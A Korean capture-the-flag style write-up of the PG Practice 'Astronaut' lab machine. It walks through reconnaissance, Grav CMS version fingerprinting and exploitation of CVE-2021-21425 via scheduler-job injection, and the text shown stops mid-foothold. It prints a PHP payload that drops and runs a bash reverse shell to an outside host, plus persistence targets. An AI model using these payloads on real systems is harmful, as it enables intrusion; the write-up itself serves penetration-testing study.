---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/lin/suid
  - tech/lin/cron
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.115.12
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2021-21425, CVE-2021-4034]
status: solved
manual_tags: true
tech_count: 3
---
> [!info] PG Practice — Pentester Foundations #5
> **타겟** 192.168.248.12 · **OS** Ubuntu 20.04 (`gravity`) · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 80 Grav CMS → **CVE-2021-21425** 비인증 YAML 쓰기로 스케줄러에 잡 삽입 → 크론 발화 → `www-data` → **SUID `php7.4`** → root

## 0. 이 박스에서 배우는 것

- **인증 체크보다 앞선 지점의 취약점** — 취약점이 인가 게이트 앞에 있으면 **HTTP 응답은 정상 흐름(로그인 페이지)을 그대로 보여준다.** 응답으로 성패를 판정하면 박스를 통째로 놓친다
- **크론 기반 지연 실행 RCE** — 파일을 쓰는 것과 코드가 도는 것 사이에 **최대 60초의 시차**가 있다. 반대로 "셸이 늦게 붙는다"는 크론을 의심하라는 신호다
- **CSRF 토큰(nonce)이 인증 앞에서 새는 것이 왜 결함인가** — 토큰은 세션에 묶여야 방어이고, 안 묶이면 공격 재료다
- **403은 규칙의 누락을 찾으라는 신호** — 확장자 화이트리스트에 `json` 하나가 빠져서 51개 패키지 버전이 통째로 샜다
- **SUID 목록에서 노이즈 걷어내기** — 우분투 기본 SUID 목록을 외워두면 3초 만에 비표준 하나를 골라낸다
- **`sh -p`의 `-p`가 장식이 아닌 이유** — 셸은 `euid ≠ uid`일 때 스스로 특권을 드롭한다

> [!tip] 시험 출제 가능성
> **높다.** 세 가지 축이 전부 시험 단골이다.
> ① **CMS 버전 판정 → 공개 익스플로잇 적용**은 OSCP 시험 웹 박스의 표준 형태다. Grav가 나올 확률은 낮지만 "설정 파일에 잡/명령을 심는 CMS"는 형태를 바꿔 계속 나온다.
> ② **크론 발화형 RCE**는 [[Exfiltrated]]·[[Muddy]]에서 이미 다른 얼굴로 나왔다. 시험장에서 "익스는 통했는데 셸이 안 붙는다"의 최다 원인이다.
> ③ **SUID 인터프리터 권한상승**은 난이도 낮은 박스의 단골 마무리다. `find / -perm -4000`은 셸 잡고 5초 안에 치는 명령이다.
>
> 변형 예상: 스케줄러 대신 **백업 경로·로그 경로·이메일 sendmail 경로**를 설정 파일로 받는 CMS. 인증 앞에서 저장되는 구조면 동일하게 뚫린다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ sudo nmap -Pn -sS -sV -T4 -p- --min-rate 2000 192.168.248.12
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
```

> [!note] 플래그 해설
> | 플래그 | 역할 | 빼면 |
> |---|---|---|
> | `-Pn` | 호스트 디스커버리(ping) 생략 | ICMP를 막는 랩 타겟이 **"host down"으로 스킵**된다. PG/OSCP 랩에서는 사실상 필수 |
> | `-sS` | SYN 스캔 (half-open) | `-sT`(connect)로 떨어져 느려지고 로그가 더 남는다. root 권한 필요 → `sudo` |
> | `-sV` | 서비스 버전 배너 | `Apache httpd 2.4.41` 같은 판정 재료가 사라진다 |
> | `-p-` | 전 65535 포트 | 기본 1000포트만 본다. [[Hawat]]은 이걸 빼면 시작조차 못 한다 |
> | `--min-rate 2000` | 초당 최소 패킷 | `-p-`가 수십 분으로 늘어난다 |
>
> 이 박스는 포트가 22/80뿐이라 `-p-`가 결과를 바꾸진 않았지만, **"바꾸지 않았다"는 것도 스캔을 돌려야 알 수 있는 사실**이다.

**공격면은 80 하나다.** 22는 자격증명이 없으면 아무것도 아니다. 즉 **웹에서 뭔가를 얻지 못하면 이 박스는 진행이 안 된다** — 이 판단을 초반에 내려두면 열거에 시간을 배분할 근거가 생긴다.

루트가 **디렉터리 리스팅**이고 항목이 `grav-admin/` 하나뿐이다. Grav CMS(PHP flat-file CMS) 확정.

> [!tip] 디렉터리 리스팅이 켜져 있으면 그 자체가 열거 결과다
> `dirb`/`ffuf`를 돌리기 전에 **루트를 눈으로 먼저 본다.** Apache autoindex가 켜져 있으면 워드리스트로 맞출 필요가 없고, 게다가 **파일 타임스탬프**까지 딸려 나온다(뒤의 버전 판정 근거 C).

### 정보 유출 두 갈래 — 버전 판정의 재료

**① Whoops 백트레이스가 비인증으로 통째로 노출된다**

URL에 `#`(=`%23`)를 넣으면 Grav가 파싱에 실패하며 500과 함께 **218KB짜리 Whoops 디버그 페이지**를 뱉는다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o w.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n' 'http://192.168.248.12/grav-admin/%23.txt'
HTTP=500 SIZE=218880

┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ grep -oE 'Undefined index: path|/var/www/html/grav-admin/[^"]+\.php' w.html | sort -u | head
Undefined index: path
/var/www/html/grav-admin/system/src/Grav/Common/Grav.php
```

**웹루트 절대경로(`/var/www/html/grav-admin`)와 전체 스택 프레임**을 공짜로 얻는다. ([[RubyDome]]에서 500을 유발해 gem 버전을 뽑은 것과 같은 수법 — 이번엔 URL에 `#` 하나만 넣으면 된다)

> [!note] `curl` 플래그 해설
> | 플래그 | 역할 |
> |---|---|
> | `-s` | 진행률 표시 억제. 파이프로 넘길 때 필수 |
> | `-o w.html` | 본문을 파일로. 218KB를 터미널에 쏟지 않는다 |
> | `-w 'HTTP=%{http_code} SIZE=%{size_download}\n'` | **상태코드와 크기만** 한 줄로. 열거 단계의 기본형 |
>
> **`%23`을 쓰는 이유**: 셸/curl 관점에서 `#`를 그대로 쓰면 URL 프래그먼트로 잘려 **서버에 전송되지 않는다.** 퍼센트 인코딩해야 경로의 일부로 서버까지 도달한다. 같은 계열: `%00`·`%0a`·`%2e%2e%2f`.

**② `.htaccess` 확장자 목록에 `json`이 빠져 있다**

Grav의 `.htaccess`는 `system/`·`vendor/` 하위를 차단하는데, 규칙이 확장자 화이트리스트 방식이라 누락이 생긴다:

```apache
^(system|vendor)/(.*)\.(txt|xml|md|html|yaml|yml|php|pl|py|cgi|twig|sh|bat)$
```

`json`이 없다. 그래서 **같은 디렉터리에서 `.php`는 403인데 `.json`은 200**이다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o /dev/null -w 'installed.json HTTP=%{http_code} SIZE=%{size_download}\n' \
    http://192.168.248.12/grav-admin/vendor/composer/installed.json
installed.json HTTP=200 SIZE=126903
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s -o /dev/null -w 'installed.php HTTP=%{http_code}\n' \
    http://192.168.248.12/grav-admin/vendor/composer/installed.php
installed.php HTTP=403
```

`installed.json`에는 **51개 의존 패키지의 버전 + git commit reference**가 전부 들어 있다.

> [!tip] 차단 규칙은 "무엇을 막는가"보다 "무엇을 빠뜨렸는가"를 본다
> 확장자 화이트리스트/블랙리스트 방식의 접근 제어는 **누락이 생기기 마련**이다.
> 403이 나오면 포기하지 말고 **같은 파일의 다른 확장자, 같은 디렉터리의 다른 파일**을 찔러본다.
> `.json`·`.lock`·`.map`·`.bak`·`.dist`·`.orig`·`.swp`가 상습 누락 대상이다.

> [!warning] 403과 404는 다른 신호다
> - **404** = 그 경로에 아무것도 없다 → 다른 경로를 찾아라
> - **403** = **뭔가 있는데 규칙이 막고 있다** → 규칙의 구멍을 찾아라
>
> 스캐너는 403을 "실패"로 표시하고 넘어간다. 사람이 봐야 하는 지점이 여기다. ffuf를 돌릴 때 `-mc all` 또는 최소한 `-mc 200,301,302,403`으로 403을 살려두는 이유다.

### 버전 판정 — 독립 근거 3개

| 근거 | 출처 | 결론 |
|---|---|---|
| **A. Whoops 스택 프레임의 라인 번호** | 런타임 (최상위) | `Grav.php:739` = `$media_file = $parsed_url['path'];` → 예외 `Undefined index: path`와 일치. **1.7.8 이상**, ≤1.7.7 배제 |
| **B. `installed.json` 51개 패키지 대조** | 패키지 메타데이터 | 1.7.8과 **51/51 완전 일치**. 1.7.9는 2건 불일치(`phpuseragentparser` v1.3.0 vs v1.4.0, `whoops` 2.9.2 vs 2.10.0) |
| **C. Apache autoindex 타임스탬프** | 서버 파일시스템 | `grav-admin/ 2021-03-17 17:46` ↔ Grav 1.7.8 태그 커밋 `2021-03-17T17:44:48Z` (1분 뒤 설치) |

→ **Grav 코어 1.7.8** 확정.

> [!tip] 근거의 우열을 매겨라 — 전부 같은 무게가 아니다
> **런타임 증거(A) > 파일 메타데이터(B) > 타임스탬프 정황(C)** 순이다.
> A는 실행 중인 코드가 직접 뱉은 것이라 조작 여지가 없다. C는 "설치 시각이 릴리스 직후"라는 정황일 뿐 **재설치·시각 조작에 취약**하다.
> 셋이 어긋나면 A를 믿고, **셋이 일치하면 그때 "확정"이라고 쓴다.** 근거 하나로 버전을 확정하고 익스를 던지면 안 되는 이유는 [[Hub]]·[[Levram]]·[[RubyDome]]에서 반복 확인했다.

Admin 플러그인은 별도로 판정한다 — **취약점 관점에서 중요한 건 이쪽**이다. 정적 자산의 콘텐츠 해시를 업스트림 git blob과 대조([[Levram]] 기법):

| 파일 | 판정 |
|---|---|
| `themes/grav/js/admin.min.js` (515478 B) | 1.10.6·1.10.7에만 존재 → **≥1.10.8 배제** |
| `themes/grav/css-compiled/template.css` | blob `47fe3ffb…` = **1.10.7 정확 일치** (1.10.6은 `85ee7d63…`) |
| `admin/vendor/composer/installed.json` | blob `37706b14…` = **1.10.7 정확 일치** |

→ **Admin 플러그인 1.10.7** 확정.

> [!danger] 코어 버전과 플러그인 버전은 **별개로 판정해야 한다**
> Grav는 코어(`grav`)와 관리자 플러그인(`grav-plugin-admin`)이 **독립 릴리스**다. CVE-2021-21425는 **플러그인 쪽** 취약점이다.
> 코어 버전만 보고 "1.7.8이니까 취약/안전"이라고 판단하면 틀린다. **CVE가 어느 컴포넌트에 붙어 있는지 먼저 읽고, 그 컴포넌트의 버전을 찾아라.**
> 같은 함정: WordPress 코어 vs 플러그인, Jenkins 코어 vs 플러그인, Confluence vs 매크로.

> [!warning] GitHub Releases의 `published_at`에 속을 뻔했다
> Releases API는 admin 1.10.7을 **2021-03-19**로 표시해서 코어 1.7.8(03-17)보다 늦어 보인다. 그러면 "1.7.8에 1.10.7이 번들될 리 없다"는 잘못된 결론이 나온다.
> 소급 등록된 릴리스이고 **태그 커밋 날짜가 진짜다**:
> ```
> grav-plugin-admin 1.10.7  2021-03-17T17:43:19Z
> grav              1.7.8    2021-03-17T17:44:48Z   ← 89초 뒤
> ```
> **릴리스 페이지 날짜 ≠ 커밋 날짜.** 시간순으로 뭔가를 추론할 때는 커밋 날짜를 봐라.
>
> 확인법(시험장에서도 30초):
> ```bash
> curl -s https://api.github.com/repos/<org>/<repo>/git/ref/tags/<tag>
> # → object.sha 를 얻은 뒤
> curl -s https://api.github.com/repos/<org>/<repo>/git/tags/<sha>   # tagger.date = 진짜 날짜
> ```

CVE-2021-21425의 영향 범위는 exploit-db `49788.rb`(Metasploit 모듈) 본문에서 확인된다 — **1.10.7 포함(inclusive)**. 타겟이 정확히 1.10.7이므로 해당.

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ searchsploit grav cms
GravCMS 1.10.7 - Arbitrary YAML Write/Update ...      | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary Fi ...     | php/webapps/49788.rb
Grav CMS 1.7.10 - Server-Side Template Injection      | php/webapps/49961.py
```

> [!tip] Metasploit 모듈은 **못 써도 읽어라**
> 시험에서 msf 모듈 실행은 1대로 제한되지만, **`.rb` 본문을 읽는 것은 제한이 아니다.**
> 모듈 상단의 `Ranking`·`References`·버전 체크 로직에 **영향 범위와 전제조건이 코드로 적혀 있다.** 이 박스에서 "1.10.7 포함"을 확정한 근거가 정확히 그것이다.
> `searchsploit -m 49788` 로 받아서 `head -60` 만 봐도 CVE 설명 문서보다 정확할 때가 많다.

---

## 2. 취약점 분석 — CVE-2021-21425

### 2-1. 배경 지식 — flat-file CMS에서 "설정 파일"은 곧 "실행 정의"다

Grav는 **데이터베이스가 없는 CMS**다. 콘텐츠도 설정도 전부 파일이고, 설정은 YAML이다.

```
/var/www/html/grav-admin/
├── system/                  코어 (읽기 전용)
├── user/
│   ├── config/              ← 사용자 설정. 여기가 표적
│   │   └── scheduler.yaml   ← 스케줄러 잡 정의
│   ├── plugins/
│   └── pages/
├── vendor/                  composer 의존성
└── bin/grav                 CLI 진입점
```

여기서 결정적인 성질은 이것이다 — **`scheduler.yaml`은 단순한 설정이 아니라 "실행할 명령"의 정의다.**

> [!note] "설정 쓰기 = RCE"가 성립하는 조건
> 임의 파일 쓰기가 곧 코드 실행이 되려면 셋 중 하나가 필요하다.
> | 조건 | 예 |
> |---|---|
> | ① 쓴 파일이 **코드로 파싱**된다 | `.php` 웹셸을 웹루트에 |
> | ② 쓴 파일이 **템플릿 엔진**을 거친다 | Twig/Jinja SSTI |
> | ③ 쓴 파일이 **명령을 정의**한다 | **크론/스케줄러/서비스 유닛/`.bashrc`/`authorized_keys`** ← 이 박스 |
>
> ①이 막혀 있어도 ③이 열려 있으면 끝난다. **"임의 쓰기가 되는데 웹루트에 못 쓴다"고 포기하기 전에, 그 시스템이 어떤 파일을 명령으로 읽는지 목록을 만들어라.**

③ 유형의 **표적 목록**은 외워둘 가치가 있다. 임의 쓰기를 손에 넣었을 때 무엇을 노릴지 즉시 정해진다:

| 표적 | 발화 조건 | 실행 주체 |
|---|---|---|
| **애플리케이션 스케줄러 설정** (`scheduler.yaml`, `config/schedule.php`) | 앱의 크론 러너가 읽을 때 | 앱 실행 계정 ← **이 박스** |
| `/etc/cron.d/*`, `/var/spool/cron/crontabs/<user>` | 매분 크론이 스캔 | **root** (`/etc/cron.d`면) |
| `/etc/systemd/system/*.service` | 서비스 재시작/부팅 | **root** |
| `~/.ssh/authorized_keys` | 다음 SSH 로그인 | 해당 사용자 |
| `~/.bashrc`, `~/.profile`, `/etc/profile.d/*.sh` | 다음 로그인 셸 | 해당 사용자 |
| `/etc/passwd`(쓰기 가능 시) | 즉시 (`su` 로 전환) | 새로 만든 uid 0 계정 |
| `.git/hooks/*`, CI 설정(`.gitlab-ci.yml`) | 다음 push/파이프라인 | 러너 계정 |
| PHP `auto_prepend_file` (`.user.ini`) | 다음 PHP 요청 | 웹 계정 |

> [!tip] 표적을 고르는 기준은 "쓸 수 있는가"가 아니라 **"누가 실행하는가"**다
> `~/.bashrc`에 쓸 수 있어도 그 계정으로 아무도 로그인하지 않으면 영원히 안 돈다.
> **쓰기 가능 × 실행 주체의 권한 × 발화 빈도** — 이 셋의 곱이 가장 큰 표적을 고른다.
> 이 박스에서 `scheduler.yaml`이 정답인 이유는 **발화 빈도가 60초**이기 때문이다. 실행 주체는 `www-data`(root가 아님)지만, 확실하게 도는 쪽이 우선이다.

### 2-2. 왜 취약한가 — 저장이 인가 검사보다 **앞에** 있다

Grav Admin 플러그인은 관리자 화면의 모든 동작을 `task=` 파라미터로 받는다. `POST /grav-admin/admin/config/scheduler` + `task=SaveDefault` 조합이 스케줄러 설정을 저장하는 태스크다.

문제는 **요청 처리 순서**다:

```
POST /grav-admin/admin/config/scheduler   (세션 없음, 비인증)
        │
        ├─(1) 라우팅 — /admin/* 이므로 Admin 플러그인이 요청을 인수
        │
        ├─(2) nonce 검증 ─────────── 통과 (로그인 페이지에서 얻은 값이 그대로 유효)
        │
        ├─(3) task=SaveDefault 실행 ── ★ user/config/scheduler.yaml 에 YAML 기록 ★
        │                                └ 여기서 이미 공격은 끝났다
        │
        ├─(4) 인증/인가 확인 ───────── 실패 (로그인 안 됨)
        │
        └─(5) 로그인 페이지 렌더 → HTTP 200 + <title>Grav Admin Login</title>
```

취약점의 본질은 **(3)과 (4)의 순서가 뒤바뀐 것**이다. 정상 설계라면 (4)가 (2)보다도 앞에 와야 한다.

> [!danger] 이 클래스의 이름을 기억하라 — "인가 게이트 앞의 부작용"
> 웹 취약점을 찾을 때 보통 "인증을 어떻게 우회할까"를 고민하지만, 이 부류는 **우회할 필요조차 없다.** 인가 검사는 정상 동작하고 있고, 다만 **그 검사가 실행되기 전에 이미 상태가 변경**되었을 뿐이다.
> 같은 구조로 생기는 것들: 인증 필터 앞에 붙은 로깅/감사 훅, 미들웨어 순서가 잘못된 프레임워크 설정, `beforeAction`이 아니라 `afterAction`에 둔 권한 체크, Spring `@PreAuthorize` 누락.
> **탐지 반사: 비인증 상태로 "쓰기" 엔드포인트를 그냥 때려보고, 응답이 아니라 부작용을 확인한다.**

> [!warning] `[가정]` 소스 수준의 정확한 호출 스택
> 위 (1)~(5)는 **관측된 동작과 익스플로잇 동작에서 역산한 흐름**이다. 타겟이 정지되어 `AdminController` 원문을 다시 확인할 수 없으므로, "어느 메서드가 어느 순서로 불리는가"의 함수명 수준 서술은 `[가정]`이다.
> **확정 사실은 이것뿐이다** — 비인증 POST 후 응답은 로그인 페이지(200)였고, 60초 뒤 잡이 실행되어 셸이 붙었다. 즉 **쓰기는 인증 실패 전에 완료되었다.**

### 2-3. nonce가 방어가 아니라 공격 재료인 이유

CVE-2021-21425를 태우려면 **admin nonce**가 필요한데, Grav 1.10.7의 로그인 페이지가 이걸 그냥 내준다:

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ curl -s http://192.168.248.12/grav-admin/admin | grep -oE 'admin-nonce" value="[a-f0-9]+"'
admin-nonce" value="0d218dcad1d32fb88e106abb9d5473e4"
```

> [!tip] CSRF 토큰이 로그인 전에 보이면 그 자체가 결함이다
> nonce/CSRF 토큰은 **인증된 세션에 묶여야** 의미가 있다. 로그인 폼에 박혀 있는 토큰이 관리자 기능에도 그대로 통한다면, 그 토큰은 방어가 아니라 **공격 재료**다.
> 익스플로잇을 실행하기 전에 이 한 줄로 **전제조건 충족 여부를 먼저 확인**하는 습관을 들일 것. 안 나오면 다른 경로를 찾아야 한다.

토큰이 방어로 성립하려면 세 가지가 모두 필요하다:

| 요구 조건 | Grav 1.10.7의 실제 |
|---|---|
| ① 세션에 **바인딩**된다 (내 세션의 토큰은 내 세션에서만 유효) | **미충족** — 비인증 페이지의 토큰이 관리자 태스크에서 통한다 |
| ② 공격자가 **읽을 수 없다** (동일 출처 정책에 의존) | **미충족** — 인증 없이 `curl` 한 줄로 읽힌다 |
| ③ 검증 **실패 시 부작용이 없다** | 검증은 통과했으므로 무관, 하지만 (2-2)에 따라 **인가 실패 시에도 부작용이 남는다** |

**CSRF 토큰은 "제3자 사이트가 사용자를 시켜 요청을 보내는 것"을 막는 장치이지, "공격자가 직접 요청을 보내는 것"을 막는 장치가 아니다.** 이 구분이 흐려진 설계에서 토큰은 그냥 한 단계 더 긁어와야 하는 값일 뿐이다.

### 2-4. 왜 이 페이로드인가

취약점은 `POST /grav-admin/admin/config/scheduler` 가 **인증 체크보다 먼저 YAML을 저장**한다는 것이다. `task=SaveDefault` + 노출된 nonce를 붙이면 `user/config/scheduler.yaml`에 임의 잡을 심을 수 있다.

심어지는 내용:

```yaml
command: /usr/bin/php
args: '-r eval(base64_decode("<payload>"));'
at: '* * * * *'
status: { ncefs: enabled }
```

조각별 역할:

| 조각 | 역할 | 빼거나 틀리면 |
|---|---|---|
| `command: /usr/bin/php` | 실행 바이너리. **절대경로** | 스케줄러의 `PATH`에 의존하게 되어 실패 가능. 절대경로가 안전 |
| `args: '-r ...'` | PHP에 인라인 코드를 넘긴다. 파일을 만들 필요가 없다 | `-r` 없이는 첫 인자를 **스크립트 파일 경로**로 해석한다 |
| `eval(base64_decode("..."))` | 인용 지옥 회피 (아래 참조) | 원문 PHP를 그대로 넣으면 YAML·셸·PHP 파서 어딘가에서 깨진다 |
| `at: '* * * * *'` | 크론 표기 — **매분 실행** | 주기가 길면 그만큼 기다린다. `*/5` 였으면 5분 |
| `status: { ncefs: enabled }` | 잡을 **활성화**한다. `ncefs`는 잡 ID | 없으면 잡이 정의만 되고 **돌지 않는다** |

> [!danger] `status`를 빼먹으면 조용히 아무 일도 안 일어난다
> 설정 파일에 잡을 심는 부류의 공격에서 **가장 흔한 실패 원인이 "정의는 했는데 활성화를 안 한 것"**이다.
> 에러도 없고 응답도 같고 그냥 셸이 안 붙는다 → "익스가 안 통하네"로 오판하게 된다.
> **잡/작업/훅을 심을 때는 항상 `enabled`/`active`/`status` 계열 키가 따로 있는지 확인하라.**

페이로드(디코드 후):

```php
/*<?php /**/
file_put_contents('/tmp/rev.sh', base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE='));
chmod('/tmp/rev.sh', 0755);
system('bash /tmp/rev.sh');
```

여기서도 **명령을 base64로 감싸는 기법**을 썼다 — YAML → PHP `-r` → 셸로 3중 인용을 통과해야 하기 때문이다. ([[RubyDome]]과 동일한 이유)

> [!note] 인용이 몇 겹인지 세어보라
> 리버스셸 원문은 `bash -i >& /dev/tcp/192.168.45.207/4444 0>&1` 이다. 여기엔 `>`·`&`·`/`·공백이 들어 있다. 이 문자열이 통과해야 하는 파서는:
> ```
> HTTP POST 본문 (URL 인코딩)
>   └─ YAML 파서        ← ' " : # - 이 전부 특수문자
>       └─ PHP -r 인자 (셸 argv 분해)   ← & 는 백그라운드, > 는 리다이렉트
>           └─ PHP 문자열 리터럴        ← ' " \ 
>               └─ system() → /bin/sh  ← 다시 셸 메타문자
> ```
> **다섯 겹이다.** 각 층에서 이스케이프를 정확히 맞추는 것은 가능하지만 실수 확률이 높고 디버깅이 지옥이다.
> **base64는 `[A-Za-z0-9+/=]` 만 쓰므로 위 다섯 층 전부에서 특수문자가 아니다.** 그래서 인코딩 한 번으로 층 전체를 무력화한다.
> 같은 계열: [[Hawat]]의 `0x3c3f706870...` hex 리터럴, [[Exfiltrated]]의 base64 래핑, [[Squid]]의 `INTO DUMPFILE`.

> [!note] 페이로드 첫 줄 `/*<?php /**/`의 정체
> PHP `-r` 은 **`<?php` 태그 없이 코드를 받는다.** 그런데 EDB 원본 페이로드는 파일에 써도 동작하도록 만들어져 있어 태그가 섞여 있다.
> `/*<?php /**/` 는 `-r` 문맥에서는 **통째로 주석**(`/* ... */`)이고, 파일로 실행될 때는 `<?php`가 살아나는 **양쪽 다 동작하는 트릭**이다. 실전에서 그대로 두면 되고, 직접 짤 때는 그냥 빼도 된다.

### 2-5. "응답이 성공을 뜻하지 않는다" — 이 박스가 대표 사례인 이유

취약점이 **인가 게이트 앞**에 있으면, 애플리케이션은 자기 관점에서 **정상적으로 요청을 거절**한다. 그 거절이 응답에 그대로 나타난다. 공격 성공/실패와 응답 내용은 **애초에 상관관계가 없다.**

```
공격자가 보는 것        : HTTP 200 + Grav Admin Login 페이지 (= 거절당한 것처럼 보임)
서버에서 실제 일어난 일 : scheduler.yaml 이 이미 덮어써짐
```

> [!danger] 이 패턴은 이제 다섯 박스에서 나왔다 — 전부 **리스너/부작용을 봐야** 판별된다
> | 박스 | 겉보기 | 실제 |
> |---|---|---|
> | [[Crane]] | 스크립트가 멈춤 → 타임아웃 | 역직렬화가 인라인 발화, 셸은 이미 붙음 |
> | [[RubyDome]] | `HTTP=000` (curl exit 28) | 리버스셸이 요청을 물고 있음 |
> | **Astronaut** | **`200` + 로그인 페이지** | **쓰기는 인증 전에 완료, 60초 뒤 크론이 발화** |
> | [[Exghost]] | curl이 매달림 | 업로드가 exiftool을 발화시켜 셸이 붙는 중 |
> | [[Hawat]] | 항상 동일한 이슈 목록(200) | `service.GetAll()`이 무조건 렌더 — 주입 결과가 응답에 안 나옴 |
>
> **판정 규칙: 익스플로잇을 던지기 전에 리스너를 먼저 띄우고, 던진 뒤에는 응답이 아니라 리스너와 부작용을 본다.**
> 부작용 확인 채널: ① 리스너(nc) ② 아웃바운드 DNS/HTTP 콜백 ③ 타겟 파일 변화 ④ 응답 시간.

### 2-6. 왜 60초를 기다려야 하는가 — 지연 실행의 구조

YAML을 썼다고 코드가 도는 게 아니다. **실행 주체가 따로 있다.**

```
[공격자] POST → user/config/scheduler.yaml 기록          t = 0s
                        │ (여기서 아무 일도 일어나지 않는다)
[시스템 crontab] * * * * * cd /var/www/html/grav-admin; /usr/bin/php bin/grav scheduler
                        │
                        ↓ 다음 분 경계에서 발화                t ≤ 60s
[bin/grav scheduler] scheduler.yaml 읽음 → ncefs 잡 enabled 확인 → 실행
                        │
                        ↓
[/usr/bin/php -r ...] → /tmp/rev.sh 생성 → bash 실행 → 리버스셸           셸 도착
```

**두 개의 크론이 겹쳐 있다는 점**이 헷갈리는 지점이다:
- **시스템 crontab** — 매분 `bin/grav scheduler`를 깨운다. 이건 박스의 원래 구성이고 우리가 만든 게 아니다
- **Grav 내부 스케줄러** — 깨어난 뒤 `scheduler.yaml`의 잡들을 `at:` 표기에 따라 실행한다. 우리가 심은 게 여기

즉 **시스템 크론이 없으면 이 CVE는 파일 쓰기로 끝난다.** RCE로 승격되는 것은 "Grav 설치 안내가 시킨 crontab 등록"이 되어 있기 때문이다.

> [!tip] 역추론 — "셸이 늦게 붙으면 크론을 의심하라"
> 익스플로잇 후 지연이 발생하는 원인은 사실상 셋뿐이다.
> | 지연 | 원인 | 확인법 |
> |---|---|---|
> | **주기적(정확히 60초/300초 배수)** | **크론/스케줄러** | 리스너를 켜둔 채 2주기 기다린다. 두 번 붙으면 확정 |
> | 불규칙, 사람 개입 시점 | 관리자 시뮬레이션 봇 (XSS/피싱형 박스) | 5~15분 단위로 붙는다 |
> | 즉시지만 느림(수 초) | 큐/워커(Redis·Sidekiq·Celery) | 부하와 무관하게 일정 |
>
> **반대 방향도 중요하다: 크론이 원인이면 "재시도 비용이 60초"다.** 페이로드를 고칠 때 한 번에 여러 변형을 심어야 한다([[Exfiltrated]]에서 같은 결론).

### 2-7. 이 클래스를 **처음 보는 타겟에서** 찾아내는 절차

CVE 번호를 아는 상태에서 재현하는 것과, 아무 정보 없이 같은 결함을 찾아내는 것은 다른 일이다. 시험에는 CVE가 없는 커스텀 앱이 나온다. 절차로 정리하면:

**① 관리자 화면의 "동작" 엔드포인트를 목록화한다**
로그인 페이지 HTML만으로도 상당 부분이 드러난다 — `<form action=...>`, `task=`/`action=`/`op=` 파라미터, JS 번들 안의 라우트 문자열.
```bash
curl -s http://TARGET/admin | grep -oE '(action|href)="[^"]+"' | sort -u
curl -s http://TARGET/admin/js/app.js | grep -oE '"/[a-z0-9/_-]{4,}"' | sort -u
```

**② 비인증 상태로 그대로 때린다 — 응답은 보지 않는다**
관리 엔드포인트에 인증 없이 POST를 보낸다. 302든 200이든 403이든 **판정 재료가 아니다.**

**③ 부작용 채널을 미리 붙여둔다**
응답으로 알 수 없으므로 다른 관찰창이 필요하다.
| 채널 | 방법 |
|---|---|
| 설정이 실제로 바뀌었나 | 같은 설정을 **읽는 다른 경로**(공개 API·페이지 렌더 결과)를 전후 비교 |
| 아웃바운드 콜백 | 페이로드에 `curl http://<내IP>/ping` 을 심고 kali에서 `nc -lvnp 80` 또는 `python3 -m http.server` |
| 시간 | 페이로드에 `sleep 5` — 응답이 아니라 **다음 발화 시점**의 지연으로 나타날 수 있다 |
| 리스너 | 항상 켜둔다 |

**④ 인가 게이트의 위치를 역산한다**
`GET`으로 같은 엔드포인트를 부르면 로그인 페이지가 나오는데 `POST`의 **부작용만 남는다면** — 게이트가 렌더 직전에 있고 태스크 디스패치보다 뒤에 있다는 뜻이다. 그게 이 취약점의 지문이다.

> [!danger] 이 절차의 핵심은 "응답을 보지 않는 습관"이다
> 사람은 응답을 본다. 200이면 기뻐하고 403이면 접는다. **인가 게이트 앞의 부작용 취약점은 정확히 그 습관을 이용해 숨는다.**
> 시험장에서 이 절차를 실행하는 비용은 **엔드포인트당 10초**다. 관리자 패널이 있는 박스에서 한 바퀴 돌려볼 가치가 충분하다.

---

## 3. Foothold — CVE-2021-21425 실행

### 3-1. 리스너부터 띄운다

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ tmux new-session -d -s astro 'rlwrap nc -lvnp 4444'
```

> [!note] 플래그 해설
> | 조각 | 역할 | 빼면 |
> |---|---|---|
> | `tmux new-session -d -s astro` | 리스너를 **분리된 세션**에 띄운다 | 터미널이 리스너에 묶여 다음 명령을 못 친다 |
> | `rlwrap` | readline 래핑 — **↑ 히스토리·백스페이스·화살표**가 먹는다 | 원시 nc 셸에서 오타를 못 지운다. 삶의 질 차이가 크다 |
> | `nc -l` | listen 모드 | — |
> | `-v` | 연결 정보 출력 | 어디서 붙었는지 안 보인다 |
> | `-n` | DNS 역조회 안 함 | 역조회 대기로 몇 초 지연 |
> | `-p 4444` | 포트 지정 | — |
>
> **1024 미만 포트(443·80·53)를 쓸 땐 `sudo`가 필요하다.** 아웃바운드가 막힌 박스에서는 그쪽이 정답이다([[Hawat]]).

### 3-2. 익스플로잇 실행

```bash
┌──(kali㉿kali)-[~/PG/Astronaut]
└─$ python3 grav_exp.py            # EDB 49973 기반, 타겟/LHOST만 수정
[+] nonce: 741f0720c9ae832283ee6c81d25a570a
[+] status: 200 len: 15592
<title>Grav Admin Login | Grav</title>
```

> [!danger] 응답이 **로그인 페이지(200)** 로 돌아온다 — 실패가 아니다
> "인증이 안 됐으니 실패했구나" 하고 접으면 박스를 놓친다.
> **YAML 쓰기는 인증 체크 앞에서 이미 일어났다.** Grav는 저장한 뒤에야 권한을 확인하고 로그인 페이지로 리다이렉트한다.
> 즉 **HTTP 응답은 공격 성공 여부를 알려주지 않는다.** 부작용(파일이 써졌는지, 잡이 도는지)으로 판단해야 한다.

> [!warning] 그리고 **약 60초를 기다려야 한다**
